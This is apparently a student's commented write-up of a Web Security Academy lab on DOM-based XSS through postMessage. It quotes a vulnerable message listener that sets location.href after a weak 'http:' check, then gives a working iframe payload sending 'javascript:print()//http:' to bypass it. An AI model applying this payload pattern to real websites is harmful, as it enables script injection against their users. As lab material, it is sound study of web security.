/*

1) viewing source reveals:

<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>

//  The event being listened for is the "message" event, 
    which is triggered when a message is sent to the window 
    using the postMessage() method from another window or iframe

//  e executes with message being triggered
    The function takes an e parameter, 
    which represents the event object associated with the "message" event.

//  sets the data recieved through postmessage API to the URL
    checks if the url has 'http' or 'https' present to validate


2) <iframe src="https://0aa000e0037f3277800d170b005f00d1.web-security-academy.net/" onload="this.contentWindow.postMessage('print()','*')">

//  the context of injection is javascript so the mal message data being sent
    should resolve to javascript calling the print() function
    and the whole data should be understood by the url parser as javascript also
    

<iframe src="https://0aa000e0037f3277800d170b005f00d1.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">


    
*/